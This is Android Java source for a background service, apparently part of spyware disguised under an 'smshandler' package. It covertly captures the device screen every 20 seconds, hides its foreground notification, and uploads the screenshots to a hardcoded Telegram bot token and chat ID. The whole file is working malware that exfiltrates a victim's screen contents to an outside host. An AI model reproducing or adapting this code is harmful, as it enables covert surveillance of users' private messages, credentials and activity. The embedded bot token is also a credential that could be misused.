package com.smshandler;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class ScreenRecorderService extends Service {

    public static final String ACTION_RECORD = "ACTION_RECORD";
    public static final String EXTRA_SECONDS = "seconds";

    private static MediaProjection mediaProjection;
    private static VirtualDisplay virtualDisplay;
    private static ImageReader imageReader;
    private static int screenWidth;
    private static int screenHeight;
    private static int screenDensity;
    public static boolean isRecording = false;
    private static Handler handler = new Handler();
    private static int resultCode;
    private static Intent resultData;

    private static final String BOT_TOKEN = "8755444402:AAHMnXZp0cY60w8HC-bkr_Ut_VNKALeY6Es";
    private static final String CHAT_ID = "8623638607";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "screen_record", "Screen Recorder",
                NotificationManager.IMPORTANCE_NONE);
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
            Notification notification = new Notification.Builder(this, "screen_record")
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build();
            startForeground(2, notification);
            if (manager != null) {
                manager.cancel(2);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if (ACTION_RECORD.equals(action)) {
                if (resultCode != -1 && resultData != null) {
                    startScreenCapture();
                }
            } else if (intent.getIntExtra("code", -1) != -1) {
                resultCode = intent.getIntExtra("code", -1);
                resultData = intent;
                startScreenCapture();
            }
        }
        return START_STICKY;
    }

    public static void setResultData(int code, Intent data) {
        resultCode = code;
        resultData = data;
    }

    private void startScreenCapture() {
        MediaProjectionManager projectionManager =
            (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);

        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(metrics);

        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;

        imageReader = ImageReader.newInstance(
            screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);

        virtualDisplay = mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            screenWidth, screenHeight, screenDensity,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.getSurface(), null, null);

        isRecording = true;

        handler.postDelayed(captureRunnable, 1000);
    }

    private Runnable captureRunnable = new Runnable() {
        @Override
        public void run() {
            if (isRecording) {
                captureAndSend();
                handler.postDelayed(this, 20000);
            }
        }
    };

    private void captureAndSend() {
        try {
            Image image = imageReader.acquireLatestImage();
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * screenWidth;

                Bitmap bitmap = Bitmap.createBitmap(
                    screenWidth + rowPadding / pixelStride,
                    screenHeight, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);

                if (rowPadding > 0) {
                    bitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
                }

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                byte[] imageBytes = baos.toByteArray();

                String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);
                sendScreenshotToTelegram(encodedImage);

                image.close();
                bitmap.recycle();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendScreenshotToTelegram(String encodedImage) {
        try {
            String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss",
                Locale.getDefault()).format(new Date());

            File tempFile = new File(getCacheDir(), "screen.jpg");
            FileOutputStream fos = new FileOutputStream(tempFile);
            fos.write(Base64.decode(encodedImage, Base64.DEFAULT));
            fos.close();

            String caption = URLEncoder.encode("Screen Captured\nTime: " + timestamp, "UTF-8");
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN
                + "/sendPhoto?chat_id=" + CHAT_ID + "&caption=" + caption;

            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.getInputStream();
            conn.disconnect();

        } catch (Exception e) {
            try {
                String timestamp = new SimpleDateFormat("HH:mm:ss",
                    Locale.getDefault()).format(new Date());
                String text = URLEncoder.encode("Screen Captured at " + timestamp, "UTF-8");
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN
                    + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + text);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.getInputStream();
                conn.disconnect();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void stopRecording() {
        isRecording = false;
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }

    @Override
    public void onDestroy() {
        stopRecording();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
